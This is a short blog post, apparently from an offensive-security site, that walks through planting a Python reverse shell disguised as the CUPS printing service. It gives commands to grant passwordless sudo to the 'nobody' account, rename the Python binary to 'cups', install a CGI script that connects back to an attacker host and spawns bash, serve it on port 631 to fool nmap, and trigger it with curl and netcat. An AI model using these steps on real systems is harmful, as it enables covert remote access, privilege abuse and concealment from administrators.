---
layout: post
title:  "Reverse shell using Python"
categories: reverse_shell
summary: Create reverse shell with Python
---

{% include instructions.md %}

### {{page.title}}

Python reverse shell and fake it to look like CUPS
Give a sudo rights to user nobody without need to give a password
```shell
# nano /etc/sudoers.d/nobody
nobody ALL=(ALL) NOPASSWD:ALL
```

Fake Python to look like CUPS, create a Python script and start a Python server
```shell
# python -V
```

Python 2.7.12
```shell
# cp /usr/bin/python /usr/bin/cups
# mkdir -p /var/www/cgi-bin
# nano /var/www/cgi-bin/index.py

#! /usr/bin/cups  
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("[attacker domain]",51920));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

# chmod a+x /var/www/cgi-bin/index.py
# cd /var/www/
# /usr/bin/cups -m CGIHTTPServer 631
```

If you would NMAP victim’s computer with default options it would look like ipp(CUPS) service is running
```shell
# nmap -p 631 [victim ip address]
PORT    STATE SERVICE
631/tcp open  ipp
In attacker’s computer listen 51920 port using Netcat and send HTTP request to malicious site

# nc -l -p 51920
# curl 'http://[victim ip address]:631/cgi-bin/index.py'
```